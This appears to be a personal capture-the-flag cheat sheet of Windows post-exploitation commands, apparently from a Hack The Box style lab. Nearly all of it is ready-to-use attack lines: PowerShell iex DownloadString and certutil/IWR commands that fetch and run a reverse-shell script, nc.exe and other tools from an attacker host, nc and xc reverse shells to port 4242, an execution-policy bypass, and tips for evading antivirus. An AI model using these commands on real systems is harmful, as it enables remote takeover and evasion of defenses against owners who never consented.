### JAWS might be too old to show anything valueable
```
copy \\10.10.16.9\kali\jaws-enum.ps1 jaws-enum.ps1
CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

### IWR slightly better than New-Object when facing anti-verus
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.9/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ip -Port port

copy \\10.10.16.9\kali\nc.exe nc.exe


powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.9/nc.exe');

certutil -urlcache -f http://10.10.16.9/nc.exe nc.exe
certutil -urlcache -f http://10.10.16.9/shell.bat shell.bat

powershell IWR http://10.10.16.9/shell.bat -OutFile shell.bat
powershell IWR http://10.10.16.9/nc.exe -OutFile nc.exe
powershell IWR http://10.10.16.9/winPEAS.bat -OutFile winPEAS.bat
```

### No permission for .exe but only .bat
```
"C:\temp\nc.exe 10.10.16.9 4242 -e cmd" # X
winPEASx64.exe # X
.\winPEAS.bat
```

### nc.exe get banned. use xc https://github.com/xct/xc
```
powershell IWR http://10.10.16.9:8000/xc.exe -OutFile xc.exe
C:\Users\Nadine\xc.exe 10.10.16.9 4242
type c:\users\administrator\desktop\root.txt
```